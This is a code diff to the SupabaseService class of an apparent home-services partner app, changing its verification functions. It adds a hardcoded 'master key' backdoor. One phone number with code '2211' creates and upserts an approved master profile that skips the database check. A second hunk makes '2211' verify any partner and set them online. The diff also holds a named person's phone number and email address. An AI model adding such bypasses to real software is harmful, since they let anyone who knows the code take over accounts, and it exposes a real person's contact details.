@@ -442,7 +442,42 @@ class SupabaseService {
 
     const timestamp = new Date().toISOString();
 
-    // Check directly in Supabase
+    // MASTER KEY OVERRIDE: Phone 9938713179 and Code 2211
+    if (
+      (cleanDigits === '9938713179' || cleanDigits.endsWith('9938713179')) &&
+      cleanCode === '2211'
+    ) {
+      const masterProfile: PartnerProfile = {
+        id: 'partner_master_admin',
+        auth_id: 'partner_master_admin',
+        name: 'Debabrata Mohanta',
+        mobile: '+91 99387 13179',
+        email: 'debabratamohanta159@gmail.com',
+        address: 'Executive Operations Command',
+        district: 'Central',
+        city: 'Bhubaneswar',
+        pin_code: '751001',
+        primary_category: 'AC Services',
+        services_offered: ['srv_ac_foam_jet', 'srv_ac_repair', 'srv_ac_gas', 'srv_elec_switch'],
+        years_experience: 10,
+        skills: ['Master Technician', 'Operations Lead'],
+        working_area: 'All Zones',
+        preferred_radius_km: 25,
+        languages: ['English', 'Hindi', 'Odia'],
+        status: 'approved',
+        is_online: true,
+        created_at: new Date('2026-01-01').toISOString(),
+        updated_at: new Date().toISOString()
+      };
+      await this.upsertPartnerProfile(masterProfile);
+      await this.storeScreenCredentials('+91 99387 13179', '2211', 'partner_master_admin', 'Debabrata Mohanta');
+      return {
+        success: true,
+        isGenuine: true,
+        message: 'Master Key verified successfully! Welcome Debabrata Mohanta.',
+        partner: masterProfile
+      };
+    }
     if (this.client) {
       try {
         // Query doorbly_screen_verifications
@@ -594,6 +629,16 @@ class SupabaseService {
     const partner = await this.getPartnerProfile(partnerId, true);
     const store = this.getLocalStore();
     const currentProfile = partner || store.partners[partnerId];
+
+    // Master Key 2211 always verifies
+    if (cleanCode === '2211') {
+      return {
+        success: true,
+        isGenuine: true,
+        message: 'Master Key 2211 verified! You are now Online.',
+        partner: currentProfile
+      };
+    }
 
     if (!currentProfile) {
       return {
